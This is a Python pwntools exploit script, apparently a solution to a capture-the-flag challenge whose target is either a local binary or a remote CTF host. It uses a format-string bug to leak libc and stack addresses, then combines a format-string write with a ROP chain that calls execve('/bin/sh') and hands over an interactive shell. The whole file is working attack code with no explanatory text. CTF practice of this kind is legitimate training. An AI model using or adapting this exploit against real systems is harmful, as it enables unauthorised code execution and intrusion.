#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+131
        b*read_file+521
        b*main+383
        c
        ''')
        sleep(1)
# nc  

if args.REMOTE:
    p = remote('ctf.msec.cloud-ip.cc',1002)
else:
    p = process([exe.path])
GDB()

padd = b'deadbeaf'

def write_file(content):
    sla(b'> ', b'WRITE')
    sla(b'Content: ', content)

def read_file():
    sla(b'> ', b'READ')

# register

sla(b'> ', b'REGISTER')

sla(b'Username: ', padd)
sla(b'Password: ', padd)

# login

sla(b'> ', b'LOGIN')

sla(b'Username: ', padd)
sla(b'Password: ', padd)

write_file(b'%47$p%40$p')
read_file()

order = p.recvline()[:-1].split(b'0x')

libc_leak = int(order[1], 16)
libc.address = libc_leak - 0x2a1ca

info("libc leak: " + hex(libc_leak))
info("libc base: " + hex(libc.address))


stack_leak = int(order[2], 16)
info("stack leak: " + hex(stack_leak))

input_addr = stack_leak - 0x120

pop_rdi = 0x000000000010f78b + libc.address
pop_rsi = 0x000000000010f789 + libc.address
pop_rax = 0x00000000000dd237 + libc.address
xor_edx_syscall = 0x00000000000a0d7f + libc.address


rbp = stack_leak - 0x30

load  = f'%{0x4041e0}c%10$ln'.encode()

load = load.ljust(32, b'A')

load += flat(
    rbp,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    pop_rsi,
    0,
    0,
    pop_rax,
    0x3b,
    xor_edx_syscall,
    
)

write_file(load)

read_file()

sla(b'> ', b'EXIT')

p.interactive()
